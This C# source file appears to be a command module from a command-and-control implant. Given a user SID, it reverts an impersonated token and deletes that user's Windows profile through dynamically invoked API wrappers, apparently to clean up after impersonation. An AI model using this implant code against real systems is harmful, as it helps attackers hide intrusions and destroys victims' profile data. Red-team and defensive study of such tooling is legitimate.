using DynamicEngLoading;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class CleanupInteractiveProfile : EngineerCommand
    {
        public override string Name => "cleanupinteractiveprofile";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (!task.Arguments.TryGetValue("/sid", out string sid))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No user SID provided for profile to clean up", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }
                else
                {
                    //revert to self so we can delete the profile
                    h_DynInv_Methods.AdvApi32FuncWrapper.RevertToSelf();
                    if (h_DynInv_Methods.UserenvFuncWrapper.DeleteProfile(sid, null, null))
                    {
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Successfully deleted profile, note registry keys still exist", task, EngTaskStatus.Complete, TaskResponseType.String);
                    }
                    else
                    {
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Failed to delete profile", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                    }
                }

            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
            }
           

        }
    }
}
